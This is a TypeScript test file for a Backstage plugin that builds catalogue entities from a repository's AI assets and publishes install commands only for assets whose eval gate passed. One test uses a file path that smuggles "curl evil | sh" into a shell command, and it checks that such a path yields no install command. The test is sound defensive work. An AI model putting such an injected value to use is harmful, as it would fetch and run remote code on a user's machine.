import { Entity } from '@backstage/catalog-model';
import {
  ANNOTATION_COMMIT,
  ANNOTATION_EVAL_SCORE,
  ANNOTATION_EVAL_SCORE_REF,
  ANNOTATION_SOURCE_LOCATION,
  readEvalScore,
  scoreState,
  readInstallCommands,
  isInstallable,
} from '@internal/plugin-skill-hub-common';
import { readFileSync } from 'fs';
import { join } from 'path';
import { RepoRef, TreeEntry } from '../github/GithubAssetReader';
import { buildEntities, publishedPaths } from './entities';
import { parseManifest } from './manifest';

const SHA = 'a'.repeat(40);
const REPO: RepoRef = {
  owner: 'wololo-labs',
  repo: 'estate',
  defaultBranch: 'main',
  archived: false,
};

function repository(files: Record<string, string>) {
  const tree: TreeEntry[] = Object.keys(files).map(path => ({
    path,
    sha: `blob-${path}`,
    type: 'blob',
  }));
  return {
    tree,
    read: async (path: string) => {
      const content = files[path];
      if (content === undefined) throw new Error(`no blob at ${path}`);
      return content;
    },
  };
}

const find = (entities: Entity[], kind: string, name: string) =>
  entities.find(e => e.kind === kind && e.metadata.name === name);

describe('buildEntities', () => {
  it('turns each publish key into its own spec type, pinned to the commit', async () => {
    const files = {
      'skills/commit/SKILL.md':
        '---\nname: commit\ndescription: Make well formed commits\n---\n\n# Commit\n',
      'agents/engineering/reviewer.agent.md':
        '---\nname: reviewer\ndescription: Reviews a diff\n---\n',
      'utilities/hooks/stop.py':
        '#!/usr/bin/env python3\n"""Runs when the session stops."""\n',
      'prompts/triage.md': '---\ndescription: Triage an incident\n---\n',
      'evals/qe.eval.md': '---\ndescription: The QE benchmark\n---\n',
      'rules/style.md': '---\ndescription: House style\n---\n',
    };
    const manifest = parseManifest(`
owner: team-ai-platform
publish:
  skills:  skills/*/SKILL.md
  agents:  agents/**/*.agent.md
  hooks:   utilities/hooks/*.py
  prompts: prompts/*.md
  evals:   evals/*.eval.md
  rules:   rules/*.md
`);

    const { entities, counts } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest,
      ...repository(files),
    });

    expect(entities.map(e => e.spec?.type).sort()).toEqual([
      'agent',
      'eval-suite',
      'hook',
      'prompt',
      'rule',
      'skill',
    ]);
    expect(counts).toEqual({
      skills: 1,
      agents: 1,
      hooks: 1,
      prompts: 1,
      evals: 1,
      rules: 1,
    });

    const skill = find(entities, 'AiResource', 'commit')!;
    expect(skill.metadata.namespace).toBe('wololo-labs-estate');
    expect(skill.metadata.description).toBe('Make well formed commits');
    expect(skill.spec?.owner).toBe('group:default/team-ai-platform');
    // A skill is a directory of files, so it is addressed as a tree.
    expect(skill.metadata.annotations?.[ANNOTATION_SOURCE_LOCATION]).toBe(
      `url:https://github.com/wololo-labs/estate/tree/${SHA}/skills/commit/`,
    );
    expect(skill.metadata.annotations?.[ANNOTATION_COMMIT]).toBe(SHA);

    // Python has no frontmatter, so the module docstring is the description.
    expect(find(entities, 'AiResource', 'stop')!.metadata.description).toBe(
      'Runs when the session stops.',
    );
  });

  it('has no score, and therefore no install, for a standalone asset', async () => {
    const manifest = parseManifest(
      'owner: team\npublish:\n  skills: skills/*/SKILL.md\n',
    );
    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest,
      ...repository({
        'skills/lonely/SKILL.md': '---\ndescription: On its own\n---\n',
      }),
    });

    const skill = entities[0];
    expect(isInstallable(skill)).toBe(false);
    // The gate is enforced here, not only in the UI: no passing score, no
    // command to copy.
    expect(readInstallCommands(skill)).toEqual({});
  });

  it('gives a pack its score and gives its members the same score and command', async () => {
    const manifest = parseManifest(`
owner: team-ai-platform
publish:
  packages: packages/*/apm.yml
  skills:   packages/*/.apm/skills/*/SKILL.md
`);
    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest,
      ...repository({
        'packages/qe-agent-pack/apm.yml': [
          'name: qe-agent-pack',
          'version: 0.1.0',
          'description: Quality engineering agent pack',
          'keywords: [testing, qe]',
          'dependencies:',
          '  mcp:',
          '    - name: playwright-test',
          '      transport: stdio',
          '      command: npx',
          '      args: ["playwright", "run-test-mcp-server"]',
        ].join('\n'),
        'packages/qe-agent-pack/eval-score.json': JSON.stringify({
          verdict: 'PASS',
          recorded: '2026-09-04',
          metrics: { mutation_kill_rate: { candidate: 0.3, baseline: 0.23 } },
        }),
        'packages/qe-agent-pack/.apm/skills/webapp-testing/SKILL.md':
          '---\ndescription: Drive a local web app\n---\n',
      }),
    });

    const pack = find(entities, 'System', 'qe-agent-pack')!;
    expect(pack.metadata.title).toBe('qe-agent-pack 0.1.0');
    expect(pack.metadata.tags).toEqual(['testing', 'qe']);
    expect(readEvalScore(pack)?.verdict).toBe('PASS');
    expect(isInstallable(pack)).toBe(true);
    expect(readInstallCommands(pack).copilot).toBe(
      `apm install 'wololo-labs/estate/packages/qe-agent-pack#${SHA}' --target copilot`,
    );

    // A member is installed as the pack, and carries the pack's score so the
    // gate is a local check rather than a second lookup.
    const skill = find(entities, 'AiResource', 'webapp-testing')!;
    expect(skill.spec?.system).toBe('qe-agent-pack');
    expect(skill.metadata.annotations?.[ANNOTATION_EVAL_SCORE_REF]).toBe(
      'system:wololo-labs-estate/qe-agent-pack',
    );
    expect(readEvalScore(skill)?.verdict).toBe('PASS');
    expect(readInstallCommands(skill).claude).toBe(
      `apm install 'wololo-labs/estate/packages/qe-agent-pack#${SHA}' --target claude`,
    );

    // The MCP server the pack declares is an API entity, not an AiResource.
    const mcp = find(entities, 'API', 'playwright-test')!;
    expect(mcp.spec?.type).toBe('mcp-server');
    expect(mcp.spec?.system).toBe('qe-agent-pack');
  });

  it('takes the score from the gate report, ahead of anything transcribed by hand', async () => {
    const measuredAt = 'c'.repeat(40);
    const gateReport = JSON.stringify({
      schema_version: '1.0.0',
      verdict: 'pass',
      reason: '',
      recorded: '2026-09-04',
      source: 'https://github.com/wololo-labs/wololo-evals/actions/runs/1',
      sourceVisibility: 'internal',
      subject: {
        repo: 'wololo-labs/estate',
        path: 'packages/qe-agent-pack',
        commit: measuredAt,
      },
      signals: [
        {
          evaluator_id: 'qe_review',
          candidate_mean: 0.8,
          baseline_mean: 0.8,
          guarded: false,
        },
        {
          evaluator_id: 'mutation_kill_rate',
          candidate_mean: 0.3012,
          baseline_mean: 0.2373,
          guarded: true,
        },
      ],
    });

    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
      ),
      ...repository({
        'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\n',
        'packages/qe-agent-pack/eval-gate-report.json': gateReport,
        'packages/qe-agent-pack/eval-score.json': '{"verdict":"IGNORED"}',
      }),
    });

    const score = readEvalScore(entities[0])!;
    expect(score.verdict).toBe('PASS');
    expect(isInstallable(entities[0])).toBe(true);
    expect(score.recorded).toBe('2026-09-04');
    expect(score.measuredCommit).toBe(measuredAt);
    // The guarded signal is the headline, because it is the one the gate
    // would have failed on.
    expect(Object.keys(score.metrics!)).toEqual([
      'mutation_kill_rate',
      'qe_review',
    ]);
    expect(score.metrics!.mutation_kill_rate).toEqual({
      candidate: 0.3012,
      baseline: 0.2373,
    });
  });

  it('keeps a measurably worse asset uninstallable when its score came from eval-score.json', async () => {
    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
      ),
      ...repository({
        'packages/p/apm.yml': 'name: p\n',
        'packages/p/eval-score.json': JSON.stringify({
          verdict: 'PASS',
          stats: { significant_regression: true },
        }),
      }),
    });
    expect(scoreState(readEvalScore(entities[0]))).toBe('regressed');
    expect(isInstallable(entities[0])).toBe(false);
  });

  describe('only a gate report can show a gain', () => {
    const stateOf = async (files: Record<string, string>) => {
      const { entities } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
        ),
        ...repository({
          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
          ...files,
        }),
      });
      const score = readEvalScore(entities[0])!;
      return { state: scoreState(score), origin: score.origin };
    };
    const claim = { verdict: 'PASS', stats: { significant_improvement: true } };

    it('records a no-skill baseline only when the report says so', async () => {
      const kind = async (extra: object) => {
        const { entities } = await buildEntities({
          repo: REPO,
          commitSha: SHA,
          manifest: parseManifest(
            'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
          ),
          ...repository({
            'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
            'packages/p/eval-gate-report.json': JSON.stringify({
              verdict: 'pass',
              signals: [],
              ...extra,
            }),
          }),
        });
        return readEvalScore(entities[0])!.baselineKind;
      };
      expect(await kind({ baseline_kind: 'no-skill' })).toBe('no-skill');
      expect(await kind({})).toBeUndefined();
      expect(await kind({ baseline_kind: 'previous-release' })).toBeUndefined();
    });

    it('reads a gain from a gate report', async () => {
      expect(
        await stateOf({
          'packages/p/eval-gate-report.json': JSON.stringify({
            verdict: 'pass',
            signals: [],
            stats: { significant_improvement: true },
          }),
        }),
      ).toEqual({ state: 'gain', origin: 'gate-report' });
    });

    it('caps a gain claimed in a hand-written eval-score.json at no gain', async () => {
      expect(
        await stateOf({ 'packages/p/eval-score.json': JSON.stringify(claim) }),
      ).toEqual({ state: 'no-gain', origin: 'eval-score' });
    });

    it('caps a gain claimed in a catalogue file at no gain, whatever origin it writes for itself', async () => {
      const catalogInfo = [
        'apiVersion: backstage.io/v1alpha1',
        'kind: System',
        'metadata:',
        '  name: p',
        '  annotations:',
        `    ${ANNOTATION_EVAL_SCORE}: '${JSON.stringify({ ...claim, origin: 'gate-report' })}'`,
        'spec:',
        '  owner: user:x',
      ].join('\n');
      expect(
        await stateOf({ 'packages/p/catalog-info.yaml': catalogInfo }),
      ).toEqual({ state: 'no-gain', origin: 'catalogue' });
    });
  });

  describe('which scores get an install command at all', () => {
    const commandsFor = async (report?: object) => {
      const { entities } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          'owner: team\npublish:\n  packages: packages/*/apm.yml\n  skills: packages/*/.apm/skills/*/SKILL.md\n',
        ),
        ...repository({
          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
          'packages/p/.apm/skills/s/SKILL.md': '---\ndescription: d\n---\n',
          ...(report
            ? { 'packages/p/eval-gate-report.json': JSON.stringify(report) }
            : {}),
        }),
      });
      return [find(entities, 'System', 'p')!, find(entities, 'AiResource', 's')!].map(
        e => readInstallCommands(e),
      );
    };

    it.each([
      ['a regression', { verdict: 'regression', signals: [] }],
      ['a failed gate', { verdict: 'refused', signals: [] }],
      ['no report at all', undefined],
    ])('publishes no command for %s, so the block is not only in the UI', async (_, report) => {
      for (const commands of await commandsFor(report)) {
        expect(commands).toEqual({});
      }
    });

    it.each([
      ['a pass with no gain', { verdict: 'pass', signals: [] }],
      ['a measured gain', { verdict: 'pass', signals: [], stats: { significant_improvement: true } }],
    ])('publishes the commands for %s', async (_, report) => {
      for (const commands of await commandsFor(report)) {
        expect(Object.keys(commands)).toContain('claude');
      }
    });
  });

  describe('the commit a score was measured at', () => {
    const measuredAs = async (commit: string) => {
      const { entities } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
        ),
        ...repository({
          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
          'packages/p/eval-gate-report.json': JSON.stringify({
            verdict: 'pass',
            signals: [],
            subject: { commit },
          }),
        }),
      });
      return readEvalScore(entities[0])!.measuredCommit;
    };

    it('lower cases an upper case sha instead of dropping it', async () => {
      expect(await measuredAs('B'.repeat(40))).toBe('b'.repeat(40));
    });

    it('keeps a tag as written, so the score is stale and says what it was taken at', async () => {
      expect(await measuredAs('v1.2.0')).toBe('v1.2.0');
    });

    it('keeps the tag a catalogue file was published from', async () => {
      const { entities } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
        ),
        ...repository({
          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
          'packages/p/catalog-info.yaml': [
            'apiVersion: backstage.io/v1alpha1',
            'kind: System',
            'metadata:',
            '  name: p',
            '  annotations:',
            `    ${ANNOTATION_SOURCE_LOCATION}: url:https://github.com/wololo-labs/estate/tree/v1.2.0/packages/p/`,
            `    ${ANNOTATION_EVAL_SCORE}: '{"verdict":"PASS"}'`,
            'spec:',
            '  owner: user:x',
          ].join('\n'),
        }),
      });
      expect(readEvalScore(entities[0])!.measuredCommit).toBe('v1.2.0');
    });
  });

  describe('the statistics in the gate report', () => {
    const build = async (report: string) => {
      const { entities } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
        ),
        ...repository({
          'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\n',
          'packages/qe-agent-pack/eval-gate-report.json': report,
        }),
      });
      return entities[0];
    };

    it('reads the real test-writer-pack report as a pass with no demonstrated gain', async () => {
      // The gate report ainb-toolkit published for packages/test-writer-pack
      // on f/test-writer-pack, verbatim.
      const real = readFileSync(
        join(__dirname, '__fixtures__/test-writer-pack.eval-gate-report.json'),
        'utf8',
      );
      const entity = await build(real);
      const score = readEvalScore(entity)!;

      expect(score.measuredCommit).toBe(
        'bd06dab3518ef4da02cda155d6310de176d0e3e1',
      );
      expect(score.sourceVisibility).toBe('internal');
      expect(score.stats).toMatchObject({
        ciLow: -0.01022395119096374,
        ciHigh: 0.010485766042045853,
        confidence: 0.95,
        significantImprovement: false,
        significantRegression: false,
      });
      expect(scoreState(score)).toBe('no-gain');
      expect(isInstallable(entity)).toBe(true);
    });

    it('reads a significant improvement as a gain', async () => {
      const entity = await build(
        JSON.stringify({
          verdict: 'pass',
          signals: [],
          stats: { significant_improvement: true, ci_low: 0.02, ci_high: 0.09 },
        }),
      );
      expect(scoreState(readEvalScore(entity))).toBe('gain');
    });

    it('reads a regression verdict as regressed and not installable', async () => {
      const entity = await build(
        JSON.stringify({ verdict: 'regression', signals: [] }),
      );
      expect(scoreState(readEvalScore(entity))).toBe('regressed');
      expect(isInstallable(entity)).toBe(false);
    });

    it('does not invent a gain from a report that carries no statistics', async () => {
      const entity = await build(
        JSON.stringify({ verdict: 'pass', signals: [] }),
      );
      expect(readEvalScore(entity)!.stats).toBeUndefined();
      expect(scoreState(readEvalScore(entity))).toBe('no-gain');
    });

    it('ignores a statistic of the wrong type rather than trusting it', async () => {
      const entity = await build(
        JSON.stringify({
          verdict: 'pass',
          signals: [],
          stats: { significant_improvement: 'true', ci_low: 'low' },
        }),
      );
      expect(readEvalScore(entity)!.stats).toBeUndefined();
      expect(scoreState(readEvalScore(entity))).toBe('no-gain');
    });
  });

  it('keeps the install blocked when the gate did not pass', async () => {
    const report = (verdict: string) =>
      JSON.stringify({ verdict, signals: [], subject: { commit: 'd'.repeat(40) } });

    for (const verdict of ['regression', 'refused']) {
      const { entities } = await buildEntities({
        repo: REPO,
        commitSha: SHA,
        manifest: parseManifest(
          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
        ),
        ...repository({
          'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\n',
          'packages/qe-agent-pack/eval-gate-report.json': report(verdict),
          // A hand-written PASS beside a failed gate changes nothing.
          'packages/qe-agent-pack/eval-score.json': '{"verdict":"PASS"}',
        }),
      });

      expect(readEvalScore(entities[0])?.verdict).toBe(verdict.toUpperCase());
      expect(isInstallable(entities[0])).toBe(false);
    }
  });

  it('prefers the publisher catalogue for the score, and keeps the commit it was measured at', async () => {
    const measuredAt = 'b'.repeat(40);
    const catalogInfo = [
      'apiVersion: backstage.io/v1alpha1',
      'kind: System',
      'metadata:',
      '  name: qe-agent-pack',
      '  annotations:',
      `    ${ANNOTATION_SOURCE_LOCATION}: url:https://github.com/wololo-labs/estate/tree/${measuredAt}/packages/qe-agent-pack/`,
      `    ${ANNOTATION_EVAL_SCORE}: '{"verdict":"PASS","recorded":"2026-09-04"}'`,
      'spec:',
      '  owner: user:stevengonsalvez',
    ].join('\n');

    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest('owner: team\npublish:\n  packages: packages/*/apm.yml\n'),
      ...repository({
        'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\n',
        'packages/qe-agent-pack/catalog-info.yaml': catalogInfo,
        'packages/qe-agent-pack/eval-score.json': '{"verdict":"IGNORED"}',
      }),
    });

    const score = readEvalScore(entities[0])!;
    expect(score.verdict).toBe('PASS');
    // The score was measured somewhere other than the pinned commit, and the
    // detail page has to be able to say so.
    expect(score.measuredCommit).toBe(measuredAt);
  });

  it('publishes no install command for a path that could break its own quoting', async () => {
    const passing = JSON.stringify({ verdict: 'pass', signals: [] });
    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        "owner: team\npublish:\n  packages: 'packages/*/apm.yml'\n",
      ),
      ...repository({
        "packages/a'; curl evil | sh; '/apm.yml": 'name: hostile\nversion: 0.1.0\n',
        "packages/a'; curl evil | sh; '/eval-gate-report.json": passing,
        'packages/honest/apm.yml': 'name: fine\nversion: 0.1.0\n',
        'packages/honest/eval-gate-report.json': passing,
      }),
    });

    const hostile = find(entities, 'System', 'hostile')!;
    // Browsable and readable, but nothing to paste into a shell.
    expect(hostile).toBeDefined();
    expect(readInstallCommands(hostile)).toEqual({});
    expect(readInstallCommands(find(entities, 'System', 'fine')!).claude).toContain(
      'apm install',
    );
  });

  it('reports a repository with zero assets rather than losing it', async () => {
    const { entities, counts } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  skills: nothing/here/*/SKILL.md\n',
      ),
      ...repository({ 'README.md': '# nothing to publish\n' }),
    });

    expect(entities).toEqual([]);
    expect(counts).toEqual({});
  });

  it('blocks install for an asset whose eval gate failed', async () => {
    // A failed gate is a measurement that the asset does not work. Treating it
    // as "scored, therefore installable" would make a known-bad asset easier to
    // install than an unmeasured one.
    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
      ),
      ...repository({
        'packages/broken-pack/apm.yml': 'name: broken-pack\nversion: 0.1.0\n',
        'packages/broken-pack/eval-score.json': JSON.stringify({
          verdict: 'FAIL',
          recorded: '2026-09-04',
        }),
      }),
    });

    const pack = find(entities, 'System', 'broken-pack')!;
    expect(readEvalScore(pack)?.verdict).toBe('FAIL');
    expect(isInstallable(pack)).toBe(false);
  });

  it('keeps the first of two globs that claim the same name, and says so', async () => {
    const { entities, collisions } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  skills:\n    - a/*/SKILL.md\n    - b/*/SKILL.md\n',
      ),
      ...repository({
        'a/tdd/SKILL.md': '---\ndescription: from a\n---\n',
        'b/tdd/SKILL.md': '---\ndescription: from b\n---\n',
      }),
    });

    expect(entities).toHaveLength(1);
    expect(entities[0].metadata.description).toBe('from a');
    expect(collisions).toEqual(['AiResource:wololo-labs-estate/tdd']);
  });

  it('survives an unreadable asset without dropping the rest', async () => {
    const { entities } = await buildEntities({
      repo: REPO,
      commitSha: SHA,
      manifest: parseManifest(
        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
      ),
      ...repository({
        'packages/broken/apm.yml': 'name: [unclosed',
        'packages/fine/apm.yml': 'name: fine\n',
      }),
    });

    expect(entities.map(e => e.metadata.name)).toEqual(['fine']);
  });
});

describe('publishedPaths', () => {
  it('includes the sidecars a package needs, and nothing else', () => {
    const manifest = parseManifest(
      'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
    );
    const files = [
      'packages/qe/apm.yml',
      'packages/qe/catalog-info.yaml',
      'packages/qe/eval-score.json',
      'packages/qe/README.md',
      'packages/qe/PROOF.md',
      'unrelated.md',
    ];

    expect(publishedPaths(manifest, files).sort()).toEqual([
      'packages/qe/README.md',
      'packages/qe/apm.yml',
      'packages/qe/catalog-info.yaml',
      'packages/qe/eval-score.json',
    ]);
  });
});
